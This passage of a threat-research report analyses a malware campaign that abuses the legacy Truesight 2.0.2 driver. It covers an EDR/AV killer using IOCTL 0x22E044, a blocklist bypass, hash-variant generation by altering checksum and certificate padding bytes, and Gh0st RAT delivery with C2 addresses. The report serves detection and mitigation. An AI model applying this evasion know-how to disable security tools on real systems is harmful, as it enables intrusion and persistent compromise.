&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31148" height="217" src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId69-1024x217.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10: Downloaded Stage3 alongside with encrypted payloads.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;ol class="wp-block-list" start="3"&gt;
&lt;li&gt;&lt;strong&gt;Stage3&lt;/strong&gt;&amp;nbsp;involves loading encrypted payloads, in-memory deploying the&amp;nbsp;&lt;strong&gt;EDR/AV killer module&lt;/strong&gt;&amp;nbsp;(retrieved from the encrypted payloads), downloading and in-memory executing the&amp;nbsp;&lt;strong&gt;final stage&lt;/strong&gt;&amp;nbsp;(Gh0st RAT), and connecting to the C2 server.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Acting as downloaders, the first-stage samples often masquerade as legitimate applications, installers, and utilities. The table below provides examples of such samples that we thoroughly analyzed while the attacker’s infrastructure was still active.&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Initial Stage SHA-256&lt;/th&gt;&lt;th&gt;VT &amp;#8211; First Submission Date&lt;/th&gt;&lt;th&gt;Final Payload&lt;/th&gt;&lt;th&gt;C2 Server&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;8a955633b93b27bc6c0751064a6ad5d6c0bf7b096d72779ced1a1a73b74cec31&lt;/td&gt;&lt;td&gt;2024-11-15 02:01:45 UTC&lt;/td&gt;&lt;td&gt;Gh0st RAT&lt;/td&gt;&lt;td&gt;8[.]212[.]102[.]228:9000&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;9446165c038e30d89a877728d767a791b4beec6755834d7eeac5f3c418d4834c&lt;/td&gt;&lt;td&gt;2024-11-29 17:31:17 UTC&lt;/td&gt;&lt;td&gt;Gh0st RAT&lt;/td&gt;&lt;td&gt;8[.]210[.]12[.]177:9011&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;While the initial&amp;nbsp;&lt;strong&gt;Stage1&lt;/strong&gt;&amp;nbsp;samples work as simple downloaders without any persistence,&amp;nbsp;&lt;strong&gt;Stage2&lt;/strong&gt;&amp;nbsp;and&amp;nbsp;&lt;strong&gt;Stage3&lt;/strong&gt;&amp;nbsp;are both downloaders/loaders executed via persistent scheduled tasks (usually following the scheduled task name pattern&amp;nbsp;&lt;code&gt;MicrosoftEdgeUpdateTaskUA Task-S-1-5-18 [A-Za-z0-9]{5}&lt;/code&gt;) that abuse the DLL side-loading technique, setting its target on some benign, original, valid-signed binary. See the example below related to&amp;nbsp;&lt;strong&gt;Stage3&lt;/strong&gt;.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 11: Persistence via scheduled task related to the Stage3
(abusing DLL side-loading)." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId72.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11: Persistence via scheduled task related to the Stage3 (abusing DLL side-loading).&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;As previously mentioned, the malicious payloads delivered alongside&amp;nbsp;&lt;strong&gt;Stage2&lt;/strong&gt;&amp;nbsp;and&amp;nbsp;&lt;strong&gt;Stage3&lt;/strong&gt;&amp;nbsp;are encrypted in a form to resemble common file types like PNG, JPG, and GIF. These encrypted files typically contain either a 32-bit PE binary or shellcode. Once loaded into memory and decrypted, the payloads are either reflectively loaded (for PE binaries) or directly executed (for shellcode).&lt;/p&gt;



&lt;p&gt;To complicate the analysis, any decrypted payloads that resolve to a 32-bit PE binary are protected using the commercial tool&amp;nbsp;&lt;a href="https://vmpsoft.com/vmprotect"&gt;VMProtect&lt;/a&gt;. The attackers appear to have utilized one of the latest versions of VMProtect and intentionally opted for 32-bit code to make analysis and reconstruction significantly more difficult. This decision likely stems from the fact that most publicly available tools and techniques for reversing VMProtected binaries are designed for 64-bit binaries and older versions of the protector.&lt;/p&gt;



&lt;p&gt;Notably, while the variants of the legacy&amp;nbsp;&lt;strong&gt;Truesight&lt;/strong&gt;&amp;nbsp;driver (version 2.0.2) are typically downloaded and installed by the initial-stage samples, they can also be deployed directly by the EDR/AV killer module if the driver is not already present on the system. This indicates that although the EDR/AV killer module is fully integrated into the campaign, it is capable of operating independently of the earlier stages.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="technical-analysis-edrav-killer-module"&gt;Technical Analysis: EDR/AV Killer Module&lt;/h2&gt;



&lt;p&gt;The&amp;nbsp;&lt;strong&gt;Stage3&lt;/strong&gt;&amp;nbsp;component utilizes the EDR/AV killer module, which is stored as an encrypted payload on disk alongside&amp;nbsp;&lt;strong&gt;Stage3&lt;/strong&gt;. Once decrypted, it reveals a 32-bit DLL named&amp;nbsp;&lt;code&gt;S.dll&lt;/code&gt;, containing a single exported function:&amp;nbsp;&lt;code&gt;CLRCreateInstance&lt;/code&gt;. Like the initial-stage samples, this module is protected by the commercial tool &amp;#8211;&amp;nbsp;&lt;strong&gt;VMProtect&lt;/strong&gt;.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 12: EDR/AV killer module - 32-bit DLL protected by
VMProtect." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId77.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12: EDR/AV killer module &amp;#8211; 32-bit DLL protected by VMProtect.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;This EDR/AV killer module abuses the legacy version of the Truesight driver (2.0.2) to terminate processes related to certain security solutions. Since reverse engineering&amp;nbsp;&lt;strong&gt;VMProtected&lt;/strong&gt;&amp;nbsp;binaries is particularly challenging, we initially focused on whether the Truesight driver was being exploited in the same manner as publicly available proof-of-concepts (PoCs) &amp;#8211; Arbitrary Process Termination via IOCTL&amp;nbsp;&lt;code&gt;0x22E044&lt;/code&gt;. This was quickly confirmed by capturing the communication between the EDR/AV killer module and the Truesight driver, as shown below.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 13: Captured communication between the EDR/AV killer module
and the Truesight driver." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId80.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13: Captured communication between the EDR/AV killer module and the Truesight driver.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Encouraged by the results of our dynamic analysis, we shifted our focus to recovering the critical sections of the VMProtected code. We successfully reconstructed the most significant parts of the EDR/AV killer module, gaining deeper insights into its development. While the attacker may have drawn inspiration from publicly available PoCs (e.g.,&amp;nbsp;&lt;a href="https://github.com/MaorSabag/TrueSightKiller"&gt;TrueSightKiller&lt;/a&gt;), the implementation is&amp;nbsp;&lt;strong&gt;noticeably different&lt;/strong&gt;, suggesting it was built from scratch rather than directly reused. Below, we can see the main logic of the module.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 14: Main logic of the EDR/AV killer module." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId83.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 14: Main logic of the EDR/AV killer module.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The&amp;nbsp;&lt;strong&gt;Truesight&lt;/strong&gt;&amp;nbsp;driver (version 2.0.2) is typically downloaded and installed as a service named&amp;nbsp;&lt;code&gt;TCLService&lt;/code&gt;&amp;nbsp;by the initial-stage samples. However, if the driver is not already present on the system, the EDR/AV killer module can deploy it in the same manner. In such cases, the driver is retrieved from a public cloud, following the URL pattern:&amp;nbsp;&lt;code&gt;https[://]22mm[.]oss-cn-hangzhou[.]aliyuncs[.]com/s[.]dat&lt;/code&gt;. While the&amp;nbsp;&lt;strong&gt;OSS Region ID&lt;/strong&gt;&amp;nbsp;(e.g.,&amp;nbsp;&lt;code&gt;oss-cn-hangzhou&lt;/code&gt;) and&amp;nbsp;&lt;strong&gt;OSS Bucket Name&lt;/strong&gt;&amp;nbsp;(&lt;code&gt;22mm&lt;/code&gt;) may vary, the location remains within China (CN).&lt;/p&gt;



&lt;p&gt;With the recovered code of this module available, we were able to validate our dynamic analysis findings regarding its process termination mechanism. The module utilizes the Windows API function&amp;nbsp;&lt;code&gt;DeviceIoControl&lt;/code&gt;&amp;nbsp;to send the IOCTL&amp;nbsp;&lt;code&gt;0x22E044&lt;/code&gt;&amp;nbsp;(Arbitrary Process Termination) directly to the&amp;nbsp;&lt;strong&gt;Truesight&lt;/strong&gt;&amp;nbsp;driver’s device. This routine targets a hardcoded list of processes primarily associated with security solutions. The complete list, which includes 192 process names, can be seen in&amp;nbsp;&lt;strong&gt;Appendix A&lt;/strong&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 15: Process termination logic of the EDR/AV killer module." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId86.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 15: Process termination logic of the EDR/AV killer module.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h2 class="wp-block-heading" id="technical-analysis-the-legacy-truesight-driver"&gt;Technical Analysis: The Legacy Truesight Driver&lt;/h2&gt;



&lt;p&gt;As mentioned in previous sections, the attackers are exploiting the legacy version&amp;nbsp;&lt;strong&gt;2.0.2&lt;/strong&gt;&amp;nbsp;of the&amp;nbsp;&lt;code&gt;Truesight.sys&lt;/code&gt;&amp;nbsp;driver. They chose to do so for several reasons. Let’s dissect these reasons to better understand their approach.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Readily available PoC &amp;#8211; Source of Inspiration&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;First of all, they took advantage of a known vulnerability in the Truesight driver (&lt;strong&gt;Arbitrary Process Termination&lt;/strong&gt;) and leveraged it in their EDR/AV killer module. This was an easy task for them, as a publicly&amp;nbsp;&lt;a href="https://github.com/MaorSabag/TrueSightKiller"&gt;available PoC&lt;/a&gt;&amp;nbsp;has been around for some time, providing a source of inspiration.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Taking advantage of a Windows policy loophole&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Secondly, as you may have noticed, we refer to the&amp;nbsp;&lt;strong&gt;Truesight&lt;/strong&gt;&amp;nbsp;driver version&amp;nbsp;&lt;strong&gt;2.0.2&lt;/strong&gt;&amp;nbsp;as a&amp;nbsp;&lt;strong&gt;legacy&lt;/strong&gt;&amp;nbsp;driver. The reason for this is that starting with Windows 10 version 1607, Microsoft implemented a new policy that prevents the loading of any new kernel-mode drivers that are not signed via its Developer Portal &amp;#8211; that is, signed by Microsoft itself. Unfortunately, Truesight driver version 2.0.2 falls under the&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-policy--windows-vista-and-later-#exceptions"&gt;exceptions to Microsoft’s driver signature policy validation&lt;/a&gt;. Specifically, it belongs to the category of “Drivers signed with an end-entity certificate issued prior to July 29, 2015, that chains to a supported cross-signed CA”.&lt;/p&gt;



&lt;p&gt;To clarify, even the latest version of Windows 11 is allowed to load this legacy&amp;nbsp;&lt;strong&gt;Truesight&lt;/strong&gt;&amp;nbsp;driver (see the image below related to the&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/347acba74fdcbeac671521739f8a34ec0e378caf716c31f55616f9f843e4d0d3"&gt;original&lt;/a&gt;&amp;nbsp;&lt;strong&gt;Truesight&lt;/strong&gt;&amp;nbsp;driver version 2.0.2).&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 16: The legacy Truesight driver, version 2.0.2 - driver
signing policy exception." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId91.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 16: The legacy Truesight driver, version 2.0.2 &amp;#8211; driver signing policy exception.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;Bypassing the Microsoft Vulnerable Driver Blocklist&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Another reason why the attackers deliberately chose to use the specific&amp;nbsp;&lt;strong&gt;2.0.2&lt;/strong&gt;&amp;nbsp;version of the Truesight driver: to bypass the&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules"&gt;Microsoft Vulnerable Driver Blocklist&lt;/a&gt;, a built-in Windows mechanism designed to protect the system against known vulnerable drivers enforced through the WDAC policy. This blocklist is not solely based on hash detection; it can identify and block specific drivers using various attributes, such as the original filename, version range, hash, and TBS hash value of the certificate.&lt;/p&gt;



&lt;p&gt;The&amp;nbsp;&lt;strong&gt;TBS hash value&lt;/strong&gt;&amp;nbsp;is used in the Microsoft Vulnerable Driver Blocklist in conjunction with file attributes like the original filename, version range, etc., to accurately detect specific drivers signed by a particular certificate (identified through the calculated TBS hash value). To easily calculate TBS hash values for a specific driver, the built-in PowerShell cmdlet&amp;nbsp;&lt;code&gt;New-CIPolicyRule&lt;/code&gt;&amp;nbsp;can be used.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;(New-CIPolicyRule -DriverFilePath .\truesight3.3.0.0_original.sys -Level PcaCertificate).Where{$_.UserMode -eq $false} | Format-List -Property Name, Root&lt;/pre&gt;



&lt;p&gt;Naturally, the Truesight driver, known to be vulnerable, is included in this blocklist. Let’s examine the&amp;nbsp;&lt;strong&gt;Denied Signer&lt;/strong&gt;&amp;nbsp;entry related to the Truesight driver in the latest Microsoft Vulnerable Driver Blocklist. This entry essentially states that drivers with the original filename “&lt;strong&gt;Truesight&lt;/strong&gt;”, from version “&lt;strong&gt;0.0.0.0&lt;/strong&gt;” to “&lt;strong&gt;3.3.0.0&lt;/strong&gt;”, signed with certificates matching specific TBS hash values, are denied from loading. As a result, a wide range of Truesight driver versions are effectively blocked.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;&amp;lt;Signer ID="ID_SIGNER_WINDOWS_3RD_PARTY_2012" Name="Microsoft Windows Third Party Component CA 2012"&gt;
      &amp;lt;CertRoot Type="TBS" Value="CEC1AFD0E310C55C1DCC601AB8E172917706AA32FB5EAF826813547FDF02DD46" /&gt;
      &amp;lt;CertPublisher Value="Microsoft Windows Hardware Compatibility Publisher" /&gt;
      &amp;lt;FileAttribRef RuleID="ID_FILEATTRIB_TRUESIGHT"/&gt;
&amp;lt;/Signer&gt;
    
&amp;lt;Signer ID="ID_SIGNER_TRUESIGHT_1" Name="Sectigo Public Code Signing Root R46"&gt;
      &amp;lt;CertRoot Type="TBS" Value="A229D2722BC6091D73B1D979B81088C977CB028A6F7CBF264BB81D5CC8F099F87D7C296E48BF09D7EBE275F5498661A4"/&gt;
      &amp;lt;FileAttribRef RuleID="ID_FILEATTRIB_TRUESIGHT"/&gt;
&amp;lt;/Signer&gt;
    
&amp;lt;Signer ID="ID_SIGNER_TRUESIGHT_2" Name="DigiCert SHA2 High Assurance Code Signing CA"&gt;
      &amp;lt;CertRoot Type="TBS" Value="0BF095B845B69928B5D7DFD1C42AE4F90FEB8DC97F7830598C93E848877021FB"/&gt;
      &amp;lt;CertPublisher Value="Adlice"/&gt;
      &amp;lt;FileAttribRef RuleID="ID_FILEATTRIB_TRUESIGHT"/&gt;
&amp;lt;/Signer&gt;
&amp;lt;FileAttrib ID="ID_FILEATTRIB_TRUESIGHT" FriendlyName="Adlice Truesight.sys\3807e9a1bc159b9e8fc0c7caad10d7213ff8ed8ad1cea9ea552b093c81bf624b FileAttribute" FileName="Truesight" MinimumFileVersion="0.0.0.0" MaximumFileVersion="3.3.0.0"/&gt;&lt;/pre&gt;



&lt;p&gt;This policy has proven effective in preventing the loading of, for example, Truesight driver version&amp;nbsp;&lt;strong&gt;3.3.0&lt;/strong&gt;, as the calculated TBS hash values of the certificate for this version match those defined in the blocklist for the Truesight driver.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 17: TBS hash values - Truesight driver, version 3.3.0." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId94.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 17: TBS hash values &amp;#8211; Truesight driver, version 3.3.0.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The TBS hash value of the certificate associated with the legacy Truesight driver version&amp;nbsp;&lt;strong&gt;2.0.2&lt;/strong&gt;&amp;nbsp;is:&amp;nbsp;&lt;code&gt;1D7E838ACCD498C2E5BA9373AF819EC097BB955C&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 18: TBS hash value - Truesight driver, version 2.0.2." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId97.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 18: TBS hash value &amp;#8211; Truesight driver, version 2.0.2.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;After reviewing the latest version of the Microsoft Vulnerable Driver Blocklist, it was found that the TBS hash value&amp;nbsp;&lt;code&gt;1D7E838ACCD498C2E5BA9373AF819EC097BB955C&lt;/code&gt;, which corresponds to the certificate&amp;nbsp;&lt;code&gt;DigiCert High Assurance Code Signing CA-1&lt;/code&gt;, is indeed listed as a&amp;nbsp;&lt;strong&gt;Denied Signer&lt;/strong&gt;. However, it is associated with different drivers and&amp;nbsp;&lt;strong&gt;not&lt;/strong&gt;&amp;nbsp;with the&amp;nbsp;&lt;strong&gt;Truesight&lt;/strong&gt;&amp;nbsp;driver.&lt;/p&gt;



&lt;p&gt;As a result, the legacy&amp;nbsp;&lt;strong&gt;Truesight&lt;/strong&gt;&amp;nbsp;driver, version 2.0.2, can bypass the Microsoft Vulnerable Driver Blocklist, and its loading will not be blocked by this security mechanism.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Evading the hash-based detection&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;To further evade detection, the attackers intentionally generated thousands of variants (with different hashes) of the legacy Truesight driver (2.0.2) by altering specific parts of the PE file while ensuring the digital signature remained valid.&lt;/p&gt;



&lt;p&gt;More specifically, only two areas of the driver are modified. The first involves a specific part of the&amp;nbsp;&lt;code&gt;PE → NT Header → OptionalHeader → CheckSum&lt;/code&gt;&amp;nbsp;(4 bytes), as shown in the image below. This modification does not impact the validity of the digital signature because&amp;nbsp;&lt;a href="https://reversea.me/index.php/authenticode-i-understanding-windows-authenticode/"&gt;certain parts of the PE binary are excluded from the hash calculation during the signing process&lt;/a&gt;, such as the CheckSum field.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 19: Comparison of the legacy Truesight driver - Original
vs. Modified (CheckSum)." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId101.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 19: Comparison of the legacy Truesight driver &amp;#8211; Original vs.&amp;nbsp;Modified (CheckSum).&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;The second modification occurs at the end of the file (4 bytes), which is part of the data related to the&amp;nbsp;&lt;code&gt;WIN_CERTIFICATE&lt;/code&gt;&amp;nbsp;structure. This structure holds the&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-attribute-certificate-table-image-only"&gt;attribute certificate entry&lt;/a&gt;, which must always align to&amp;nbsp;&lt;strong&gt;quadword boundaries&lt;/strong&gt;&amp;nbsp;(8-byte boundaries). If an entry’s&amp;nbsp;&lt;code&gt;dwLength&lt;/code&gt;&amp;nbsp;does not end on an 8-byte boundary, it will be padded with zero bytes to maintain proper alignment.&lt;/p&gt;



&lt;p&gt;Modifying this zero-byte padding does not affect the signature or validity of the certificate, as it’s outside the cryptographic data. In the case of the legacy Truesight driver, the attacker can freely modify the 5-byte zero-padding area. In our example, the attacker altered only 4 bytes, even though 5 bytes could have been modified.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 20: Comparison of the legacy Truesight driver - Original
vs. Modified (WIN_CERTIFICATE padding)." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId105.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 20: Comparison of the legacy Truesight driver &amp;#8211; Original vs.&amp;nbsp;Modified (WIN_CERTIFICATE padding).&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;In summary, the attacker is modifying 8 bytes of the legacy Truesight driver (4 bytes in the&amp;nbsp;&lt;code&gt;CheckSum&lt;/code&gt;&amp;nbsp;and 4 bytes in the&amp;nbsp;&lt;code&gt;WIN_CERTIFICATE&lt;/code&gt;&amp;nbsp;padding), allowing the creation of&amp;nbsp;&lt;strong&gt;2^64&lt;/strong&gt;&amp;nbsp;unique file hashes for the same driver while still preserving the validity of the driver’s signature. We detected more than 2,500 distinct variants.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 21: Modified variant of the legacy Truesight driver - valid
signed." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId108.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 21: Modified variant of the legacy Truesight driver &amp;#8211; valid signed.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;The known vulnerability (Arbitrary Process Termination) in the Truesight driver, affecting versions below&amp;nbsp;&lt;strong&gt;3.4.0&lt;/strong&gt;, was patched over a year ago. A comparison between the original legacy Truesight driver version 2.0.2 and the patched version 3.4.0 reveals the addition of a check for the process to be terminated. If the process runs as protected (PP/PPL), which is typical for security solutions, the termination attempt will be aborted.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 22: Comparison of the vulnerable Truesight driver (2.0.2) and
the patched (3.4.0)." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId111.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 22: Comparison of the vulnerable Truesight driver (2.0.2) and the patched (3.4.0).&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="technical-analysis-final-stages"&gt;Technical Analysis: Final Stages&lt;/h2&gt;



&lt;p&gt;Among several initial-stage samples, we deeply investigated (with an active attacker´s infrastructure), all of them were deploying the same final stage &amp;#8211; a variant of the&amp;nbsp;&lt;a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.ghost_rat"&gt;Gh0st RAT&lt;/a&gt;. This well-known Remote Access Trojan (RAT), recognized for its stealth and effectiveness, is designed to remotely control compromised computers, granting attackers unauthorized access for data theft, surveillance, and system manipulation&lt;/p&gt;



&lt;p&gt;There are dozens of variants of Gh0st RAT that are derived from the&amp;nbsp;&lt;a href="https://github.com/sin5678/gh0st"&gt;available source code&lt;/a&gt;. Although the source code has been publicly available for several years, Gh0st RAT is mainly used by threat actors based in China&lt;/p&gt;



&lt;p&gt;An&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/6595e12854c2618716ecba9ed3dfa34067f162084df20973f817f69c99a478bc"&gt;example&lt;/a&gt;&amp;nbsp;of a reconstructed Gh0st RAT variant (dumped from memory and repaired), delivered through the initial-stage samples in this campaign, overlaps with the variant described in&amp;nbsp;&lt;a href="https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/gh0st-rat-spreads-using-fake-telegram-download-page"&gt;this publication&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Most of the code routines described in the article are similar to those in our delivered final-stage payload. For instance, both use the&amp;nbsp;&lt;code&gt;EnumWindow&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;GetWindowTextA&lt;/code&gt;&amp;nbsp;functions to enumerate and compare window names (using the same window names) for detection risk assessment.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 23: Gh0st RAT - detection risk assessment." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId119.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 23: Gh0st RAT &amp;#8211; detection risk assessment.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Another example is a code routine that retrieves new C2 addresses from an&amp;nbsp;&lt;code&gt;ip.txt&lt;/code&gt;&amp;nbsp;file hosted on a remote attacker-controlled server.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 24: Gh0st RAT - retrieving new C2 addresses." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId122.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 24: Gh0st RAT &amp;#8211; retrieving new C2 addresses.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;We believe this is the same Gh0st RAT variant known as&amp;nbsp;&lt;strong&gt;HiddenGh0st&lt;/strong&gt;, as described in&amp;nbsp;&lt;a href="https://asec.ahnlab.com/en/57185/"&gt;this publication&lt;/a&gt;. It shares clear similarities with the “string version” of Gh0st RAT, including the “&lt;strong&gt;hx&lt;/strong&gt;” identifier, packet encryption, and network communication via a custom protocol.&lt;/p&gt;



&lt;p&gt;One key factor for properly attributing a sample as a Gh0st RAT variant is its&amp;nbsp;&lt;a href="https://www.zscaler.com/blogs/security-research/catching-rats-over-custom-protocols"&gt;custom network protocol encryption algorithm&lt;/a&gt;. It typically involves a single-byte XOR operation combined with SUB/ADD operations on each byte, along with the RAT’s specific capabilities.&lt;/p&gt;



&lt;p&gt;Here’s an example from our sample: the initial Gh0st RAT network communication, which utilizes the custom network protocol with encryption following a similar logic &amp;#8211; applying a single-byte XOR operation combined with an ADD operation on each byte.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 25: Gh0st RAT - encryption logic of the custom network
protocol." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId127.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 25: Gh0st RAT &amp;#8211; encryption logic of the custom network protocol.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;As previously mentioned, there are dozens of publicly available versions of the Gh0st RAT malware, and any attacker can easily create their own variant. Since&amp;nbsp;&lt;a href="https://www.sentinelone.com/blog/the-curious-case-of-gh0st-malware/"&gt;it’s not considered best practice to name every version found in the wild&lt;/a&gt;, we have not assigned a specific name to our sample, which only slightly differs from others.&lt;/p&gt;



&lt;p&gt;Given the vast number of initial-stage samples involved in this campaign (thousands), the attacker may deploy another final-stage payload, though it will likely retain similar RAT functionality.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="mitigation-remediation"&gt;Mitigation &amp;amp; Remediation&lt;/h2&gt;



&lt;p&gt;As previously described, the attackers are modifying the&amp;nbsp;&lt;strong&gt;Truesight&lt;/strong&gt;&amp;nbsp;driver (version 2.0.2), making minimal changes to alter its file hash while preserving its valid digital signature. As a result, hash-based detection alone proves ineffective.&lt;/p&gt;



&lt;p&gt;At the time of our investigation, none of the legacy&amp;nbsp;&lt;strong&gt;Truesight&lt;/strong&gt;&amp;nbsp;driver variants were classified as known-vulnerable by the&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules"&gt;Microsoft Vulnerable Driver Blocklist&lt;/a&gt;&amp;nbsp;or by other common detection mechanisms, such as those implemented by the LOLDrivers project.&lt;/p&gt;



&lt;p&gt;The&amp;nbsp;&lt;strong&gt;Microsoft Vulnerable Driver Blocklist&lt;/strong&gt;&amp;nbsp;uses advanced detection mechanisms, beyond just hash-based checks, to protect against known vulnerable drivers. Since it is built into the Windows OS,&amp;nbsp;&lt;strong&gt;CPR reported&lt;/strong&gt;&amp;nbsp;the issue to&amp;nbsp;&lt;strong&gt;MSRC&lt;/strong&gt;, resulting in an updated version of the Blocklist (&lt;strong&gt;released on December 17, 2024&lt;/strong&gt;). This update effectively prevents all variants of the legacy driver exploited in this campaign.&lt;/p&gt;



&lt;p&gt;We recommend&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules#steps-to-download-and-apply-the-vulnerable-driver-blocklist-binary"&gt;manually applying&lt;/a&gt;&amp;nbsp;the latest version of the Microsoft Vulnerable Driver Blocklist, as it is usually auto-updated only once or twice a year.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;Detecting the abuse of known vulnerable drivers is essential for mitigating known threats. However, proactively hunting for the abuse of drivers not yet identified as vulnerable can lead to significant discoveries, often uncovering stealthy operations that have been flying under the radar for months or even years. This publication demonstrates how research-driven, future-focused detection rules can reveal hidden threats designed to evade detection for extended periods.&lt;/p&gt;



